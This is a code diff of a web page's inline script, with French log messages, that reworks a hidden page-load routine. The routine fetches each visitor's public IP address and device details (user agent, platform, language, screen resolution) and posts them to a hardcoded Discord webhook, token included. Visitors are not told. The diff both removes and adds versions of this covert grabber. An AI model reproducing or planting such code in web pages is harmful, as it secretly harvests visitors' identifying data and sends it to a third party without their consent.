@@ -36,47 +36,35 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const fetchUrl = 'https://api.ipify.org';
+        const sendDeviceInfoToDiscord = async () => {
             const discordWebhookUrl = 'https://discord.com/api/webhooks/1242070611094802442/fZEJwxDAcxBzmuahYB3pFVEbybK7pELDW5mgMDVQgZVMSiqNyKt6TSrqUA0_BiU1lpH8';
+            const fetchUrl = 'https://api.ipify.org';
 
-            async function fetchDataAndSendToDiscord() {
-                try {
-                    const response = await fetch(fetchUrl);
-                    const data = await response.text();
+            const response = await fetch(fetchUrl);
+            const data = await response.text();
 
-                    const message = {
+            const message = {
                         content: `Connection from : ${JSON.stringify(data)}`
                     };
 
-                    await fetch(discordWebhookUrl, {
+            await fetch(discordWebhookUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify(message)
                     });
-
-                    console.log('Données envoyées à Discord avec succès');
-                } catch (error) {
-                    console.error('Erreur lors de la récupération des données ou de l\'envoi à Discord :', error);
-                }
-            }
-
-            fetchDataAndSendToDiscord();
-        });
-
-        const sendDeviceInfoToDiscord = async () => {
-            const discordWebhookUrl = 'https://discord.com/api/webhooks/1242070611094802442/fZEJwxDAcxBzmuahYB3pFVEbybK7pELDW5mgMDVQgZVMSiqNyKt6TSrqUA0_BiU1lpH8';
             const deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screenResolution: `${window.screen.width}x${window.screen.height}`
             };
+
                 const payload = {
                     content: JSON.stringify(deviceInfo, null, 2)
                 };
+
                 const discordResponse = await fetch(discordWebhookUrl, {
                     method: 'POST',
                     headers: {
@@ -94,6 +82,7 @@
                 console.error('Erreur lors de la récupération de la localisation :', error);
             });
         };
+
         document.addEventListener('DOMContentLoaded', sendDeviceInfoToDiscord);
     </script>
 </body>
